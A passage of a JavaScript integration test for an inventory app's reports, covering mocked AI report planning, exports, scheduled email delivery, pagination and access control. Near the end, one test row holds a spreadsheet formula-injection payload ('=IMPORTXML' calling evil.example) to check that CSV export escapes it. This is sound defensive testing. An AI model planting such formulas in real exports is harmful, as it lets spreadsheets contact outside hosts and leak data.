    assert.equal(reports.comparableGroupAmounts(moneyGroups,moneyDataset,
      [{currency:'USD'}],true,'USD'),true);
    assert.throws(()=>reports.normalize({dataset:'stock',groups:['location'],
      dateGrain:'month',aggregate:'sum',measure:'on_hand'},actor),/date grouping/i);
    assert.throws(()=>reports.drilldownSpec(grouped.config,['Main','other'],actor),/one exact report group/i);
    let reportAttempts=0;
    const repaired=await reportAsk.prepare(database,ctx,'Group stock by location and sum units',{provider:{
      async complete(input){reportAttempts++;
        if(input.schemaName==='stockchief_governed_report_fit')return {data:{aligned:true,reason:''}};
        if(reportAttempts===2)assert.match(input.prompt,/Choose a registered field to sort/);
        return {data:{dataset:'stock',title:'Stock by location',columns:[],groups:['location'],
          aggregate:'sum',measure:'on_hand',filters:[],sort:reportAttempts===1?'nonexistent':'total',
          direction:'desc',chart:'bar'}};
      }}});
    assert.equal(reportAttempts,3);assert.equal(repaired.status,'ANSWERED');
    let semanticPlans=0;
    const corrected=await reportAsk.prepare(database,ctx,
      'Show stock by location, largest on-hand total first in a bar chart',{provider:{
        async complete(input){if(input.schemaName==='stockchief_governed_report_fit')
          return {data:{aligned:input.prompt.includes('"sort":"total"'),
            reason:'The first plan sorts the location label, not the total.'}};
        semanticPlans++;
        if(semanticPlans===2)assert.match(input.prompt,/sorts the location label/);
        return {data:{dataset:'stock',title:'Stock by location',columns:[],groups:['location'],
          aggregate:'sum',measure:'on_hand',filters:[],sort:semanticPlans===1?'location':'total',
          direction:'desc',chart:'bar'}};
      }}});
    assert.equal(semanticPlans,2);assert.equal(corrected.status,'ANSWERED');
    const followup=await reportAsk.prepare(database,ctx,
      'For that report, keep the same stock totals by location but only include Main',{provider:{
        async complete(input){
          const prompt=JSON.parse(input.prompt);
          if(input.schemaName==='stockchief_governed_report_fit'){
            assert.deepEqual(prompt.previousReport.groups,['location']);
            return {data:{aligned:true,reason:''}};
          }
          assert.equal(prompt.previousReport.dataset,'stock');
          assert.equal(prompt.previousReport.measure,'on_hand');
          return {data:{...prompt.previousReport,
            filters:[{field:'location',operator:'equals',value:'Main'}]}};
        }},priorReport:corrected.reportConfig});
    assert.equal(followup.status,'ANSWERED');
    assert.deepEqual(followup.reportConfig.filters,
      [{field:'location',operator:'equals',value:'Main'}]);
    assert.deepEqual(followup.reportConfig.groups,['location']);
    let partialPlans=0;
    const partialText=await reportAsk.prepare(database,ctx,
      'Show stock at locations containing Mai',{provider:{async complete(input){
        if(input.schemaName==='stockchief_governed_report_fit')
          return {data:{aligned:true,reason:''}};
        partialPlans++;
        if(partialPlans===2)assert.match(input.prompt,/exact text filter returned no records/);
        return {data:{dataset:'stock',title:'Stock at matching locations',
          columns:['product','sku','location','on_hand'],groups:[],aggregate:'count',measure:'',
          filters:[{field:'location',operator:partialPlans===1?'equals':'contains',value:'Mai'}],
          sort:'location',direction:'asc',chart:'table'}};
      }}});
    assert.equal(partialPlans,2);
    assert.equal(partialText.status,'ANSWERED');
    assert.equal(partialText.rows.length,1);
    assert.equal(partialText.rows[0].location,'Main');
    assert.equal(partialText.reportConfig.filters[0].operator,'contains');
    const canonicalCategory=await reportAsk.prepare(database,ctx,
      'Show active products in the catalogue',{provider:{async complete(input){
        if(input.schemaName==='stockchief_governed_report_fit')
          return {data:{aligned:true,reason:''}};
        return {data:{dataset:'catalogue',title:'Active products',
          columns:['product','sku','status'],groups:[],aggregate:'count',measure:'',
          filters:[{field:'status',operator:'equals',value:'act'}],
          sort:'sku',direction:'asc',chart:'table'}};
      }}});
    assert.equal(canonicalCategory.status,'ANSWERED');
    assert.equal(canonicalCategory.rows.length,1);
    assert.equal(canonicalCategory.reportConfig.filters[0].value,'active');
    assert.match(canonicalCategory.answer,/only recorded category/);
    assert.throws(()=>reports.normalize({dataset:'payments',groups:['status'],aggregate:'sum',
      measure:'amount_minor',sort:'total'},actor),/currency/i);
    const askPage=await owner.get('/ask');
    const ask=await owner.post('/ask').type('form').send({_csrf:csrf(askPage.text),
      message:'Build a bar chart report of stock by location and sum units'});
    assert.equal(ask.status,303);
    assert.equal(reportPlanCalls,2);
    const askResult=await owner.get('/ask');assert.equal(askResult.status,200);
    assert.match(askResult.text,/Units by location/);assert.match(askResult.text,/12/);
    assert.match(askResult.text,/Report bar chart/);
    assert.match(askResult.text,/Report groups/);
    const askStored=(await database.query(`SELECT id,intent FROM stockchief_runtime.assistant_interactions
      WHERE workspace_id=$1 AND actor_user_id=$2 AND intent ? 'reportConfig'
      ORDER BY created_at DESC,id DESC LIMIT 1`,[ctx.workspaceId,ctx.actorId])).rows[0];
    const askReportId=askStored.id;
    assert.equal(askStored.intent.comparisonSafe,true);
    assert.deepEqual(askStored.intent.presentation.chartAmounts,[12]);
    assert.match(askResult.text,new RegExp(`/reports/from-ask/${askReportId}`));
    assert.match(askResult.text,new RegExp(`/reports/from-ask/${askReportId}/run`));
    const mixedAsk=await owner.post('/ask').type('form').send({_csrf:csrf(askResult.text),
      message:'Compare stock across our locations in a bar chart and let me inspect the underlying records'});
    assert.equal(mixedAsk.status,303);
    assert.equal(reportPlanCalls,4);
    const mixedAnswer=await owner.get('/ask');
    assert.match(mixedAnswer.text,/Units by location/);
    assert.match(mixedAnswer.text,/Open full report and source records/);
    const askFull=await owner.get(`/reports/from-ask/${askReportId}/run`);
    assert.equal(askFull.status,200);
    assert.match(askFull.text,/See source records/);
    assert.match(askFull.text,/Customize/);
    const askBuilder=await owner.get(`/reports/from-ask/${askReportId}`);
    assert.equal(askBuilder.status,200);
    assert.match(askBuilder.text,/Customize Ask report/);
    assert.match(askBuilder.text,/value="on_hand" selected/);
    const saveAsk=await owner.post('/ask').type('form').send({_csrf:csrf(askResult.text),
      message:'Save that exact report as Weekly stock by location and schedule it Mondays at 09:00 UTC'});
    assert.equal(saveAsk.status,303);
    const proposal=(await database.query(`SELECT id,status,payload FROM stockchief_runtime.assistant_action_proposals
      WHERE workspace_id=$1 AND action_type='report.template.create'
      ORDER BY created_at DESC,id DESC LIMIT 1`,[ctx.workspaceId])).rows[0];
    assert.equal(proposal.status,'PENDING');
    assert.equal(proposal.payload.schedule.hour,9);
    assert.equal(proposal.payload.definition.sort,'total');
    assert.equal(proposal.payload.definition.direction,'desc');
    assert.equal(proposal.payload.definition.chart,'bar');
    assert.deepEqual(proposal.payload.definition.groups,['location']);
    const review=await owner.get(`/actions/${proposal.id}`);assert.equal(review.status,200);
    const approval=await owner.post(`/actions/${proposal.id}/approve`).type('form').send({_csrf:csrf(review.text)});
    assert.equal(approval.status,303);
    const askSaved=(await database.query(`SELECT id,schedule_frequency,schedule_hour_utc FROM
      stockchief_runtime.report_templates WHERE workspace_id=$1 AND owner_user_id=$2
      AND title='Weekly stock by location'`,[ctx.workspaceId,ctx.actorId])).rows[0];
    assert.equal(askSaved.schedule_frequency,'weekly');assert.equal(askSaved.schedule_hour_utc,9);
    const lineAsk=await owner.post('/ask').type('form').send({_csrf:csrf(askResult.text),
      message:'Make a monthly line-chart report of net inventory movement units'});
    assert.equal(lineAsk.status,303);
    const linePage=await owner.get('/ask');
    assert.match(linePage.text,/Report line chart/);
    assert.match(linePage.text,/Monthly inventory movement/);
    assert.ok(modelCalls.includes('stockchief_governed_report'));
    assert.rejects(()=>reports.run(database,ctx,actor,{dataset:'stock',columns:['product'],
      filters:[{field:'secret_sql',operator:'contains',value:'x'}]}),/valid report filters/i);
    const reportsPage=await owner.get('/reports');assert.equal(reportsPage.status,200);
    assert.match(reportsPage.text,/Stock by product and location/);
    const marginBuilder=await owner.get('/reports/builder?dataset=posted_sales_activity');
    assert.equal(marginBuilder.status,200);
    assert.match(marginBuilder.text,/Gross margin %/);
    const marginPreview=await owner.post('/reports/run').type('form').send({
      _csrf:csrf(marginBuilder.text),dataset:'posted_sales_activity',title:'Recorded gross margin',
      summary:'on',aggregate:'ratio',measure:'gross_margin_percent',sort:'ratio',
      filters:{0:{field:'currency',operator:'equals',value:'USD'}}});
    assert.equal(marginPreview.status,200);
    assert.match(marginPreview.text,/48\.46%/);
    assert.match(marginPreview.text,/See source records/);
    assert.match(marginPreview.text,/Gross margin %/);
    const marginSaved=await owner.post('/reports/save').type('form').send({
      _csrf:csrf(marginPreview.text),definition:JSON.stringify(postedMargin.config),frequency:'none'});
    assert.equal(marginSaved.status,303);
    const marginCsv=await owner.get(`${marginSaved.headers.location}/export.csv`);
    assert.equal(marginCsv.status,200);
    assert.match(marginCsv.text,/48\.46%/);
    const builder=await owner.get('/reports/builder?dataset=stock');assert.equal(builder.status,200);
    const token=csrf(builder.text);assert.ok(token);
    const preview=await owner.post('/reports/run').type('form').send({_csrf:token,dataset:'stock',
      title:'Warehouse stock',columns:['product','sku','location','on_hand'],sort:'product',direction:'asc'});
    assert.equal(preview.status,200);assert.match(preview.text,/Copper Clamp/);
    assert.match(preview.text,/href="\/reports\/builder\?draft=1"/);
    const scheduledPreview=await owner.post('/reports/run').type('form').send({_csrf:token,
      dataset:'stock',title:'Scheduled preview',columns:['product','sku','on_hand'],
      sort:'product',frequency:'weekly',hour:'13'});
    assert.equal(scheduledPreview.status,200);
    assert.match(scheduledPreview.text,/name="frequency" value="weekly"/);
    assert.match(scheduledPreview.text,/name="hour" value="13"/);
    const customize=await owner.get('/reports/builder?draft=1');assert.equal(customize.status,200);
    assert.match(customize.text,/value="Scheduled preview"/);
    assert.match(customize.text,/value="weekly"\s+selected/);
    const fromPreview=await owner.post('/reports/save').type('form').send({
      _csrf:csrf(scheduledPreview.text),definition:JSON.stringify(reports.normalize({dataset:'stock',
        title:'Scheduled preview',columns:['product','sku','on_hand'],sort:'product'},actor)),
      frequency:/name="frequency" value="([^"]+)"/.exec(scheduledPreview.text)[1],
      hour:/name="hour" value="([^"]+)"/.exec(scheduledPreview.text)[1]});
    assert.equal(fromPreview.status,303);
    const previewSaved=await reports.load(database,ctx,actor,fromPreview.headers.location.split('/').at(-1));
    assert.equal(previewSaved.schedule_frequency,'weekly');
    assert.equal(previewSaved.schedule_hour_utc,13);
    const invalidHour=await owner.post('/reports/run').type('form').send({_csrf:token,
      dataset:'stock',title:'Invalid delivery',columns:['sku'],sort:'sku',
      frequency:'weekly',hour:''});
    assert.notEqual(invalidHour.status,200);
    await assert.rejects(()=>reports.save(database,ctx,actor,{dataset:'stock',
      columns:['sku'],sort:'sku'},{schedule:{frequency:'weekly',hour:'',recipient:actor.email}}),
    /UTC delivery hour/);
    const groupedPreview=await owner.post('/reports/run').type('form').send({_csrf:token,dataset:'stock',
      title:'Stock by location',groups:['location'],aggregate:'sum',measure:'on_hand',sort:'total',chart:'bar'});
    assert.match(groupedPreview.text,/See source records/);
    const drilled=await owner.post('/reports/drilldown').type('form').send({_csrf:csrf(groupedPreview.text),
      definition:JSON.stringify(grouped.config),groupValues:JSON.stringify(['Main'])});
    assert.equal(drilled.status,303);
    assert.equal(drilled.headers.location,'/reports/run?view=detail');
    const drillPage=await owner.get(drilled.headers.location);
    assert.equal(drillPage.status,200);
    assert.match(drillPage.text,/Copper Clamp/);
    assert.match(drillPage.text,/Open record/);
    assert.match(drillPage.text,/href="\/reports\/run"/);
    const backToReport=await owner.get('/reports/run');
    assert.equal(backToReport.status,200);
    assert.match(backToReport.text,/See source records/);
    const saved=await owner.post('/reports/save').type('form').send({_csrf:token,dataset:'stock',
      title:'Warehouse stock',columns:['product','sku','location','on_hand'],sort:'product',direction:'asc',
      frequency:'daily',hour:'9'});
    assert.equal(saved.status,303);assert.match(saved.headers.location,/^\/reports\/saved\//);
    const reportId=saved.headers.location.split('/').at(-1);
    const view=await owner.get(saved.headers.location);assert.equal(view.status,200);
    assert.match(view.text,/Copper Clamp/);
    const csv=await owner.get(`/reports/saved/${reportId}/export.csv`);
    assert.equal(csv.status,200);assert.match(csv.text,/Copper Clamp/);
    const xlsx=await owner.get(`/reports/saved/${reportId}/export.xlsx`).buffer(true).parse(binary);
    assert.equal(xlsx.status,200);const workbook=readWorkbook(xlsx.body);
    assert.equal(workbook.sheets[0].rows[1][0],'Copper Clamp');
    const pdf=await owner.get(`/reports/saved/${reportId}/export.pdf`).buffer(true).parse(binary);
    assert.equal(pdf.status,200);assert.match(pdf.body.toString('ascii'),/^%PDF-1\.[3-7]/);
    const report=await reports.load(database,ctx,actor,reportId);
    assert.equal(report.schedule_frequency,'daily');
    const due=await database.transaction(client=>scheduling.enqueueDue(client,'2026-10-09T09:05:00.000Z'),
      {isolation:'READ COMMITTED'});
    assert.equal(due.queued,1);
    const duplicate=await database.transaction(client=>scheduling.enqueueDue(client,'2026-10-09T09:10:00.000Z'),
      {isolation:'READ COMMITTED'});
    assert.equal(duplicate.queued,0);
    const delivery=(await database.query(`SELECT * FROM stockchief_runtime.report_deliveries
      WHERE workspace_id=$1 AND template_id=$2`,[ctx.workspaceId,reportId])).rows[0];
    const sent=await scheduling.generateDelivery(database,{workspaceId:ctx.workspaceId,
      payload:{templateId:reportId,deliveryId:delivery.id}});
    assert.equal(sent.queued,true);
    const mail=(await database.query(`SELECT payload FROM stockchief_runtime.jobs WHERE id=$1`,
      [sent.emailJobId])).rows[0];
    assert.equal(mail.payload.to,'report-owner@example.test');
    assert.match(mail.payload.html,/Copper Clamp/);
    let sends=0;const handlers=runtimeHandlers.create(undefined,{emailSender:async()=>{
      sends++;return {provider:'resend',externalId:'fixture-report-email'};
    }});
    const prepared=await jobs.processOne(database,{'report.generate-delivery':handlers['report.generate-delivery']},
      {owner:'report-test-worker'});
    assert.equal(prepared.status,'COMPLETED');
    const delivered=await jobs.processOne(database,{'system.email-send':handlers['system.email-send']},
      {owner:'report-test-worker'});
    assert.equal(delivered.status,'COMPLETED');assert.equal(sends,1);
    await database.transaction(client=>scheduling.enqueueDue(client,'2026-10-09T09:20:00.000Z'),
      {isolation:'READ COMMITTED'});
    const receipt=(await database.query(`SELECT status,provider_message_id FROM stockchief_runtime.report_deliveries
      WHERE id=$1`,[delivery.id])).rows[0];
    assert.equal(receipt.status,'SENT');assert.equal(receipt.provider_message_id,'fixture-report-email');
    const other=request.agent(app);await register(other,'Other Report','other-report@example.test');
    const otherAsk=await other.get(`/reports/from-ask/${askReportId}`);assert.notEqual(otherAsk.status,200);
    const otherFull=await other.get(`/reports/from-ask/${askReportId}/run`);
    assert.notEqual(otherFull.status,200);
    const absent=await other.get(`/reports/saved/${reportId}`);assert.notEqual(absent.status,200);
    const otherExport=await other.get(`/reports/saved/${reportId}/export.csv`);assert.notEqual(otherExport.status,200);
    await catalog.createItem(database,ctx,{name:'Second report SKU',baseCode:'RPT-2',trackingMode:'quantity'});
    const firstPage=await reports.run(database,ctx,actor,{dataset:'catalogue',columns:['sku'],
      sort:'sku',direction:'asc'},{limit:2});
    assert.equal(firstPage.rows.length,1);
    assert.equal(firstPage.hasMore,true);
    const secondPage=await reports.run(database,ctx,actor,{dataset:'catalogue',columns:['sku'],
      sort:'sku',direction:'asc'},{limit:2,offset:1});
    assert.equal(secondPage.offset,1);
    assert.equal(secondPage.rows.length,1);
    assert.notEqual(secondPage.rows[0].sku,firstPage.rows[0].sku);
    await database.query(`INSERT INTO items
      (id,workspace_id,name,base_code,tracking_mode,created_at,updated_at)
      SELECT 'report-bulk-item-'||n,$1,'Bulk Report Item '||n,
        'BULK-'||lpad(n::text,4,'0'),'quantity',$2,$2
      FROM generate_series(1,1003) AS n`,[ctx.workspaceId,'2026-10-09T12:00:00.000Z']);
    await database.query(`INSERT INTO skus
      (id,workspace_id,item_id,code,is_default,created_at)
      SELECT 'report-bulk-sku-'||n,$1,'report-bulk-item-'||n,
        'BULK-'||lpad(n::text,4,'0'),1,$2
      FROM generate_series(1,1003) AS n`,[ctx.workspaceId,'2026-10-09T12:00:00.000Z']);
    const largeCombined={dataset:'composed',dimension:'sku',metrics:[
      {alias:'products',dataset:'catalogue',aggregate:'count',measure:'',filters:[]},
      {alias:'stock',dataset:'stock',aggregate:'sum',measure:'on_hand',filters:[]}],
    formula:'stock / products',formulaLabel:'Stock per product',
    chart:'table',sort:'sku',direction:'asc'};
    const largeFirst=await reports.run(database,ctx,actor,largeCombined,{limit:201});
    assert.equal(largeFirst.rows.length,200);
    assert.equal(largeFirst.hasMore,true);
    assert.equal(largeFirst.displayRows[0].stock,'Not recorded');
    assert.equal(largeFirst.displayRows[0].calculated,'Not recorded');
    const largeNext=await reports.run(database,ctx,actor,largeCombined,{limit:201,offset:200});
    assert.equal(largeNext.rows.length,200);
    assert.notEqual(largeNext.rows[0].sku,largeFirst.rows[0].sku);
    assert.equal(await reports.countAtMost(database,ctx,actor,largeCombined,1005),1005);
    const bulkSaved=await reports.save(database,ctx,actor,{dataset:'catalogue',title:'Bulk SKU list',
      columns:['sku'],sort:'sku',direction:'asc'});
    const bulkFirst=await owner.get(`/reports/saved/${bulkSaved.id}`);
    assert.equal(bulkFirst.status,200);
    assert.match(bulkFirst.text,/Next rows/);
    const bulkSecond=await owner.get(`/reports/saved/${bulkSaved.id}?offset=200`);
    assert.equal(bulkSecond.status,200);
    assert.match(bulkSecond.text,/Previous rows/);
    const bulkCsv=await owner.get(`/reports/saved/${bulkSaved.id}/export.csv`);
    assert.equal(bulkCsv.status,200);
    assert.equal(bulkCsv.text.split('\r\n').filter(Boolean).length,1006);
    assert.match(bulkCsv.text,/BULK-1003/);
    await database.query(`INSERT INTO stockchief_runtime.report_templates
      (id,workspace_id,owner_user_id,title,definition,schedule_frequency,schedule_hour_utc,delivery_email)
      SELECT 'report-page-'||number::text,$1,$2,'Scheduled page '||number::text,$3::jsonb,
        'daily',11,$4 FROM generate_series(1,501) AS number`,
    [ctx.workspaceId,ctx.actorId,JSON.stringify(stock.config),'report-owner@example.test']);
    const pagedDue=await database.transaction(client=>
      scheduling.enqueueDue(client,'2026-10-09T11:05:00.000Z'),{isolation:'READ COMMITTED'});
    assert.equal(pagedDue.queued,501,'scheduled templates after the first 500 must not starve');
    const pagedReplay=await database.transaction(client=>
      scheduling.enqueueDue(client,'2026-10-09T11:10:00.000Z'),{isolation:'READ COMMITTED'});
    assert.equal(pagedReplay.queued,0);
    await database.query('UPDATE users SET role=$2,permissions=$3 WHERE id=$1',
      [ctx.actorId,'staff',JSON.stringify(['VIEW'])]);
    const restricted=await owner.get('/reports/builder?dataset=payments');assert.equal(restricted.status,404);
    assert.throws(()=>reports.normalize({dataset:'payments',columns:['amount_minor']},
      {role:'staff',permissions:['VIEW']}),/permission|authorized|view/i);
    assert.throws(()=>reports.normalize(combinedDefinition,{role:'staff',permissions:['VIEW']}),
      /cannot be joined|unavailable/i);
    assert.ok(reportExports.csv(stock).toString().includes('Copper Clamp'));
    const unsafe={...stock,rows:[{product:'=IMPORTXML("https://evil.example", "//x")'}],
      displayRows:[{product:'=IMPORTXML("https://evil.example", "//x")'}],columns:['product']};
    assert.match(reportExports.csv(unsafe).toString(),/^"product"\r\n"'=IMPORTXML/);
    const accented=await reportExports.pdf({...unsafe,config:{title:'Caf\u00e9'}});
    assert.match(accented.toString('ascii'),/^%PDF-1\.[3-7]/);
    await assert.rejects(()=>reportExports.pdf({...unsafe,config:{title:'\u4e2d\u6587'}}),
      /cannot safely represent/);
  });
